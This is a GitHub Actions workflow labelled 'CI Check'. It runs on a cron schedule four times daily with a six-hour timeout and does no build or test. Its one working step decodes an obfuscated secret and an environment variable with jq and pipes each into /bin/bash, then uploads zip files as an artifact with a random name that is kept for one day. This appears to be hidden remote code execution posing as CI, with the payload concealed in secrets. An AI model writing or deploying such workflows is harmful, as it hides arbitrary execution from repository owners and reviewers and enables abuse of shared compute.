name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '27 4,10,16,22 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          ni81255: ${{ secrets.ni81255 }}
        run: |
          printf '%s' "$ni81255" | jq -r .mpsyi283 | /bin/bash
          echo $jmlrh6 | jq -r .kl583 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: waLCGu7F
          path: "*.zip"
          retention-days: 1
